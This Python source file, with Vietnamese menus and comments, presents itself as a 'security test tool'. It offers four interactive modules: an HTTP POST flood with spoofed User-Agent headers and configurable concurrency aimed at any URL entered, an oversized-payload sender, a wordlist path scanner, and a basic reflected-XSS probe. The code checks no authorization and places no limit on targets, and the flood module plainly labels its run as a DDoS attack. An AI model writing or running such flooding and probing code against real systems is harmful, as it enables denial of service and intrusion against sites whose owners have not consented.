# cyber_buster.py
import asyncio
import httpx
import time
import os
import random
import string
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.panel import Panel
from rich.table import Table

console = Console()

# --- Dữ liệu để giả mạo ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
]

def generate_random_payload(min_size=1024, max_size=10240):
    """Tạo một khối dữ liệu ngẫu nhiên với kích thước thay đổi."""
    size = random.randint(min_size, max_size)
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

def clear_screen():
    """Xóa màn hình console cho gọn."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_menu_choice():
    """Hiển thị menu chính và lấy lựa chọn của người dùng."""
    clear_screen()
    menu_text = """
[bold #0099FF]======================================[/]
[bold #FF6347]+++ CYBERBUSTER - Security Test Tool +++[/]
[bold #0099FF]======================================[/]

[bold yellow][1][/] Mo phong tan cong DDoS (POST Flood)
[bold yellow][2][/] Quet duong dan nhay cam
[bold yellow][3][/] Kiem tra payload qua kho
[bold yellow][4][/] Do tim XSS

[bold red][0][/] Thoat
"""
    console.print(Panel(menu_text, title="[bold cyan]Main Menu[/]", border_style="green"))
    choice = console.input("[bold #FFD700]Lua chon cua ban: [/]")
    return choice

async def request_worker(client, url, progress, task, results):
    """Gửi một yêu cầu POST với payload và User-Agent giả mạo."""
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        payload = generate_random_payload()
        response = await client.post(url, headers=headers, content=payload, timeout=10)

        if 200 <= response.status_code < 500:
            results['success'] += 1
        else:
            results['failed'] += 1

    except (httpx.RequestError, asyncio.TimeoutError):
        results['failed'] += 1
    finally:
        progress.update(task, advance=1)

async def ddos_module():
    """Module mô phỏng tấn công DDoS L7 bằng POST Flood."""
    clear_screen()
    console.print(Panel("[bold red]DDoS L7 POST Flood Simulation Module[/]", border_style="red"))

    target_url = console.input("[bold #FFD700]Nhap URL muc tieu: [/]")
    if not target_url:
        console.print("[bold red]URL không được để trống.[/]")
        input("Nhan Enter de quay lai...")
        return

    try:
        total_requests = int(console.input("[bold #FFD700]Nhap tong so request (VD: 10000): [/]")
                             )
        concurrency = int(console.input("[bold #FFD700]Nhap so request dong thoi (VD: 200): [/]")
                          )
    except ValueError:
        console.print("[bold red]Loi: So request và so dong thoi phai la so nguyen.[/]")
        input("Nhan Enter de quay lai...")
        return

    results = {'success': 0, 'failed': 0}
    start_time = time.time()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("({task.completed}/{task.total})"),
        TimeRemainingColumn(),
        console=console,
    ) as progress:
        task_id = progress.add_task("[green]Dang tan cong...", total=total_requests)

        async with httpx.AsyncClient() as client:
            for i in range(0, total_requests, concurrency):
                batch_size = min(concurrency, total_requests - i)
                tasks = [
                    request_worker(client, target_url, progress, task_id, results)
                    for _ in range(batch_size)
                ]
                await asyncio.gather(*tasks)

    end_time = time.time()
    total_time = end_time - start_time

    clear_screen()
    table = Table(title=f"Ket qua tan cong DDoS den {target_url}")
    table.add_column("Thong so", justify="right", style="cyan", no_wrap=True)
    table.add_column("Gia tri", style="magenta")

    table.add_row("Tong thoi gian", f"{total_time:.2f} giay")
    table.add_row("Tong so request", f"{total_requests}")
    table.add_row("Request thanh cong", f"[green]{results['success']}[/]")
    table.add_row("Request that bai", f"[red]{results['failed']}[/]")

    if total_time > 0:
        rps = total_requests / total_time
        table.add_row("Request / giay (RPS)", f"{rps:.2f}")

    console.print(table)
    input("\nNhan Enter de quay lai menu chinh...")

async def oversize_module():
    """Module gửi một payload cực lớn để kiểm tra khả năng xử lý của server."""
    clear_screen()
    console.print(Panel("[bold red]Oversized Payload Test Module[/]", border_style="red"))

    target_url = console.input("[bold #FFD700]Nhap URL muc tieu (VD: http://.../api/analyze): [/]")
    if not target_url:
        console.print("[bold red]URL không được để trống.[/]")
        input("Nhan Enter de quay lai...")
        return

    try:
        size_mb = float(console.input("[bold #FFD700]Nhap kich thuoc payload (MB) (VD: 10): [/]")
                       )
    except ValueError:
        console.print("[bold red]Loi: Kich thuoc phai la mot con so.[/]")
        input("Nhan Enter de quay lai...")
        return

    payload_size = int(size_mb * 1024 * 1024)
    console.print(f"Dang tao payload co kich thuoc {size_mb} MB...")
    payload = 'A' * payload_size

    console.print(f"Dang gui yeu cau POST voi payload {size_mb} MB den {target_url}...")
    start_time = time.time()

    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(target_url, content=payload, timeout=60.0)

        end_time = time.time()
        console.print("\n[bold green]--- KET QUA ---[/]")
        console.print(f"Thoi gian da qua: {end_time - start_time:.2f} giay")
        console.print(f"Server phan hoi voi status code: [bold yellow]{response.status_code}[/]")

        if response.status_code == 413:
            console.print("[bold green]=> Server đã chặn payload quá lớn – OK![/]")
        else:
            console.print(f"[bold orange3]=> Server chấp nhận payload lớn ({response.status_code}). Cần kiểm tra lại logic phòng thủ.[/]")

    except httpx.TimeoutException:
        end_time = time.time()
        console.print("\n[bold red]--- KET QUA ---[/]")
        console.print(f"Thoi gian da qua: {end_time - start_time:.2f} giay")
        console.print("[bold red]=> Server timeout – có thể bị treo do payload quá lớn.[/]")

    except httpx.RequestError as e:
        console.print(f"\n[bold red]LOI Request: {e}[/]")

    input("\nNhan Enter de quay lai menu chinh...")

async def scan_module():
    """Module quét các đường dẫn nhạy cảm."""
    clear_screen()
    console.print(Panel("[bold yellow]Vulnerable Path Scanner Module[/]", border_style="blue"))

    target_url = console.input("[bold #FFD700]Nhap URL goc (VD: http://192.168.1.189:10000): [/]")
    if not target_url:
        console.print("[bold red]URL goc không được để trống.[/]")
        input("Nhan Enter de quay lai...")
        return

    wordlist_path = console.input("[bold #FFD700]Nhap duong dan den file wordlist (mac dinh: common_paths.txt): [/]")
    if not wordlist_path:
        wordlist_path = "common_paths.txt"

    try:
        with open(wordlist_path, 'r') as f:
            paths_to_scan = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]Loi: File wordlist '{wordlist_path}' khong ton tai.[/]")
        input("Nhan Enter de quay lai...")
        return

    if not paths_to_scan:
        console.print("[bold red]File wordlist rong hoac khong co duong dan nao.[/]")
        input("Nhan Enter de quay lai...")
        return

    results = []
    concurrency_limit = 20
    start_time = time.time()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("({task.completed}/{task.total})"),
        TimeRemainingColumn(),
        console=console,
    ) as progress:
        task_id = progress.add_task("[green]Dang quet duong dan...", total=len(paths_to_scan))

        async with httpx.AsyncClient() as client:
            sem = asyncio.Semaphore(concurrency_limit)

            async def scan_worker(path, client, progress, task_id, results):
                async with sem:
                    full_url = f"{target_url.rstrip('/')}{path}"
                    try:
                        response = await client.head(full_url, timeout=5)
                        if response.status_code != 404:
                            results.append({"path": path, "status": response.status_code, "url": full_url})
                    except httpx.RequestError:
                        pass
                    finally:
                        progress.update(task_id, advance=1)

            await asyncio.gather(*[
                scan_worker(path, client, progress, task_id, results)
                for path in paths_to_scan
            ])

    end_time = time.time()

    clear_screen()
    console.print(Panel(f"Ket qua Quet duong dan nhay cam tren [bold blue]{target_url}[/]", border_style="blue"))

    if results:
        table = Table(title="Duong dan nhay cam duoc tim thay")
        table.add_column("Duong dan", style="cyan", no_wrap=True)
        table.add_column("Status Code", style="magenta", justify="right")
        table.add_column("URL day du", style="green", no_wrap=True)

        for r in results:
            table.add_row(r['path'], str(r['status']), r['url'])
        console.print(table)
    else:
        console.print("[bold green]Khong tim thay duong dan nhay cam nao.[/]")

    console.print(f"\nTong thoi gian quet: {end_time - start_time:.2f} giay")
    input("\nNhan Enter de quay lai menu chinh...")

async def xss_module():
    """Module dò tìm XSS."""
    clear_screen()
    console.print(Panel("[bold red]XSS Probe Module[/]", border_style="yellow"))

    target_url = console.input("[bold #FFD700]Nhap URL muc tieu (VD: http://.../search?q=): [/]")
    if not target_url:
        console.print("[bold red]URL không được để trống.[/]")
        input("Nhan Enter de quay lai...")
        return

    param_name = console.input("[bold #FFD700]Nhap ten tham so can kiem tra (VD: q, name): [/]")
    if not param_name:
        console.print("[bold red]Ten tham so không được để trống.[/]")
        input("Nhan Enter de quay lai...")
        return

    xss_payload = "<script>alert('XSS')</script>"

    if '?' in target_url:
        test_url = f"{target_url}&{param_name}={xss_payload}"
    else:
        test_url = f"{target_url}?{param_name}={xss_payload}"

    console.print(f"Dang gui yeu cau voi payload XSS den: [bold blue]{test_url}[/]")

    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(test_url, timeout=10)

        console.print(f"Server phan hoi voi status code: [bold yellow]{response.status_code}[/]")

        if xss_payload in response.text:
            console.print("\n[bold red]=> TIEM NANG XSS! Payload duoc phan hoi nguy ven.[/]")
            console.print(f"[bold green]URL thu: {test_url}[/]")
            console.print("[bold magenta]Can kiem tra thu cong.[/]")
        else:
            console.print("\n[bold green]=> Khong thay dau hieu XSS.[/]")
            console.print("[bold yellow]Luu y: chi la kiem tra co ban.[/]")

    except httpx.RequestError as e:
        console.print(f"\n[bold red]LOI Request: {e}[/]")

    input("\nNhan Enter de quay lai menu chinh...")

async def main():
    """Vòng lặp chính của chương trình."""
    while True:
        choice = get_menu_choice()
        if choice == '1':
            await ddos_module()
        elif choice == '2':
            await scan_module()
        elif choice == '3':
            await oversize_module()
        elif choice == '4':
            await xss_module()
        elif choice == '0':
            console.print("[bold green]Tam biet![/]")
            break
        else:
            console.print("[bold red]Lua chon khong hop le. Vui long thu lai.[/]")
            time.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red]Chuong trinh da dung boi nguoi dung.[/]")
